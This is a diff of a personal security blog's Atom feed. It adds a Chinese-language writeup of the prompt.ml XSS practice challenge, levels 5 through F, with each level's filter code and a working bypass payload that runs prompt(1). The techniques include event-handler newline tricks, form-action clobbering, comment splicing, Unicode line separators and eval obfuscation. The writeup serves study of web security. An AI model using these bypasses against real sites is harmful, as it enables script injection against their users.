@@ -1,8 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-09-20T08:37:16+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">CTF-30days writeup(web 第一期)</title><link href="http://localhost:4000/2018/09/20/30days/" rel="alternate" type="text/html" title="CTF-30days writeup(web 第一期)" /><published>2018-09-20T00:00:00+08:00</published><updated>2018-09-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/09/20/30days</id><content type="html" xml:base="http://localhost:4000/2018/09/20/30days/">&lt;p&gt;蓝鲸安全平台上 CTF 的题目，看到别人博客上有相应的 writeup 索性就打算把这上面的题目刷了，持续更新……&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;1-真的注入&quot;&gt;1. 真的注入&lt;/h2&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">蓝鲸安全平台上 CTF 的题目，看到别人博客上有相应的 writeup 索性就打算把这上面的题目刷了，持续更新……</summary></entry><entry><title type="html">CBC字节翻转攻击</title><link href="http://localhost:4000/2018/09/19/CBC/" rel="alternate" type="text/html" title="CBC字节翻转攻击" /><published>2018-09-19T00:00:00+08:00</published><updated>2018-09-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/09/19/CBC</id><content type="html" xml:base="http://localhost:4000/2018/09/19/CBC/">&lt;p&gt;最近做到了一道 CBC 字节翻转攻击的题目，这里单独拿出来分析一下，感觉这个攻击还挺有意思的。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-09-22T10:30:24+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">CBC字节翻转攻击</title><link href="http://localhost:4000/2018/09/19/CBC/" rel="alternate" type="text/html" title="CBC字节翻转攻击" /><published>2018-09-19T00:00:00+08:00</published><updated>2018-09-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/09/19/CBC</id><content type="html" xml:base="http://localhost:4000/2018/09/19/CBC/">&lt;p&gt;最近做到了一道 CBC 字节翻转攻击的题目，这里单独拿出来分析一下，感觉这个攻击还挺有意思的。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -467,13 +463,246 @@ input = input.replace(/[=(]/g, '');
 &lt;a href=&quot;http://pwdme.cc/2016/12/06/prompt-ml-xss/&quot;&gt;http://pwdme.cc/2016/12/06/prompt-ml-xss/&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;https://hellohxk.com/blog/prompt-1-writeup/&quot;&gt;https://hellohxk.com/blog/prompt-1-writeup/&lt;/a&gt;&lt;/p&gt;
 
+&lt;h3 id=&quot;level-5&quot;&gt;Level 5&lt;/h3&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// apply strict filter rules of level 0&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// filter &quot;&amp;gt;&quot; and event handlers&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&amp;gt;|on.+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;=|focus/gi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;input value=&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot; type=&quot;text&quot;&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;1、首先是过滤，把onxxxx=这样的替换为_,这里用一个回车绕过。
+2、其次是第二点，就是后面的type不可以覆盖前面的，所以可以把type=image。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;type=image src onerror
+=prompt(1) &quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-6&quot;&gt;Level 6&lt;/h3&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// let's do a post redirection&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// pass in formURL#formDataJSON&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;segments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;segments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'post'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'input'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'value'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'                         &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+&amp;lt;script&amp;gt;                                                  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+    // forbid javascript: or vbscript: and data: stuff    &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+    if (!/script:|data:/i.test(document.forms[0].action)) &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+        document.forms[0].submit();                       &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+    else                                                  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+        document.write(&quot;Action forbidden.&quot;)               &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+&amp;lt;/script&amp;gt;                                                 &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;
+        '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Invalid form data.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;        
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;首先看题目给的例子&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}
+
+HTML source:
+&amp;lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&amp;gt;&amp;lt;input name=&quot;name&quot; value=&quot;Matt&quot;&amp;gt;&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;**由于存在子级tag, action 将会优先指向name为action的子tag. **&lt;/p&gt;
+
+&lt;p&gt;例子:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/form&amp;gt;
+&amp;lt;script&amp;gt;
+    alert(document.forms[0].action);      
+&amp;lt;/script&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;正常弹出&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javascript:prompt(1)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;下面我们修改下，加上一个 input 标签&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&amp;gt;&amp;lt;input name=&quot;action&quot; value=1&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/form&amp;gt;
+&amp;lt;script&amp;gt;
+    alert(document.forms[0].action);      
+&amp;lt;/script&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;弹出&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[object HTMLInputElement]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以看到返回内容被覆盖了&lt;/p&gt;
+
+&lt;p&gt;通过上面的例子，我们构造相应的 &lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javascript:prompt(1)#{&quot;action&quot;:1}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-7&quot;&gt;Level 7&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;主要的思路就是利用 js 注释符绕过&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;/*#*/prompt(/*#*/1)/*#*/&amp;lt;/script&amp;gt;
+
+HTML source:
+&amp;lt;p class=&quot;comment&quot; title=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;/*&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;*/prompt(/*&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;*/1)/*&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;*/&amp;lt;/script&amp;gt;&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;svg a=#&quot;onload='/*#*/prompt(1)'
+
+HTML source:
+&amp;lt;p class=&quot;comment&quot; title=&quot;&quot;&amp;gt;&amp;lt;svg a=&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;&quot;onload='/*&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;*/prompt(1)'&quot;&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-8&quot;&gt;Level 8&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;是U+2028，是Unicode中的行分隔符。&lt;/li&gt;
+  &lt;li&gt;是U+2029，是Unicode中的段落分隔符。
+而且–&amp;gt;在js中可以当注释使用&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;我们要构造的答案是这样的&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+// console.log(&quot;
+prompt(1)
+--&amp;gt;&quot;);
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'\u2028prompt(1)\u2028--&amp;gt;'
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;按照上面的直接作为输入的话不能直接绕过，要将 &lt;code class=&quot;highlighter-rouge&quot;&gt;\u2028&lt;/code&gt; 转换成可见的乱码字符才能绕过。&lt;/p&gt;
+
+&lt;p&gt;这里不知道为什么直接在 console 中无法转换。&lt;/p&gt;
+
+&lt;p&gt;真正的payload是下面这个&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; prompt(1) --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-9&quot;&gt;Level 9&lt;/h3&gt;
+
+&lt;p&gt;简单的正则过滤，由&amp;lt;(开始的后面加任意字母的时候，中间都加一个_。&lt;/p&gt;
+
+&lt;p&gt;这里无法注入html的标签，但是toUppercase支持unicode字符，字符&lt;code class=&quot;highlighter-rouge&quot;&gt;ſ&lt;/code&gt;经过函数toUpperCase()处理后，会变成ASCII码字符”S”。&lt;/p&gt;
+
+&lt;p&gt;js对大小写敏感，所以代码的引入需要通过外部环境。&lt;/p&gt;
+
+&lt;p&gt;所以这道题的payload为&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;ſcript/ſrc=//⒕₨&amp;gt;&amp;lt;/ſcript&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt;外部链接的引入需要用到 Level4 的 tricks。&lt;/p&gt;
+
+&lt;h3 id=&quot;level-a&quot;&gt;Level A&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;p'rompt(1)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;### Level B ⭐️&lt;/p&gt;
+
+&lt;p&gt;利用类型判断操作符进行js代码的执行。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;(prompt(1))instanceof&quot;
+&quot;(prompt(1))in&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-c-️&quot;&gt;Level C ⭐️&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;parseInt(&quot;prompt&quot;,36); //1558153217
+
+
+(1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41))
+执行上述代码的回显结果是: prompt(1)
+
+eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
+eval() 函数黑魔法
+
+下面这几种解法也可以
+eval((1558153217).toString(36))(1)
+eval(1558153217..toString(36))(1)
+eval(630038579..toString(30))(1)
+ 
+// Hexadecimal alternative (630038579 == 0x258da033):
+eval(0x258da033.toString(30))(1)
+
+for((i)in(self))eval(i)(1)
+//遍历 self 里面的函数，但是不知道为啥我这里没有执行成功
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-d-️&quot;&gt;Level D ⭐️&lt;/h3&gt;
+
+&lt;h3 id=&quot;level-e--️&quot;&gt;Level E  ⭐️&lt;/h3&gt;
+
+&lt;h3 id=&quot;level-f&quot;&gt;Level F&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;!--#--&amp;gt;&amp;lt;script&amp;gt;&amp;lt;!--#--&amp;gt;prompt(1&amp;lt;!--#--&amp;gt;)&amp;lt;/script&amp;gt;
+
+HTML source
+&amp;lt;p class=&quot;comment&quot; title=&quot;&quot;&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;!--&quot; data-comment='{&quot;id&quot;:0}'&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;--&amp;gt;&amp;lt;script&amp;gt;&amp;lt;!--&quot; data-comment='{&quot;id&quot;:1}'&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;--&amp;gt;prompt(1&amp;lt;!--&quot; data-comment='{&quot;id&quot;:2}'&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p class=&quot;comment&quot; title=&quot;--&amp;gt;)&amp;lt;/script&amp;gt;&quot; data-comment='{&quot;id&quot;:3}'&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://lorexxar.cn/2015/07/02/xss-p/&quot;&gt;https://lorexxar.cn/2015/07/02/xss-p/&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml&quot;&gt;https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_35078631/article/details/77073233&quot;&gt;https://blog.csdn.net/qq_35078631/article/details/77073233&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="xss" /><summary type="html">xss 的在线练习，挺不错的，整个在线网站看起来也很可以。</summary></entry><entry><title type="html">hackburger writeup</title><link href="http://localhost:4000/2018/08/31/hackburger/" rel="alternate" type="text/html" title="hackburger writeup" /><published>2018-08-31T00:00:00+08:00</published><updated>2018-08-31T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/31/hackburger</id><content type="html" xml:base="http://localhost:4000/2018/08/31/hackburger/">&lt;p&gt;全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_35078631/article/details/77073233&quot;&gt;https://blog.csdn.net/qq_35078631/article/details/77073233&lt;/a&gt;&lt;/p&gt;
+
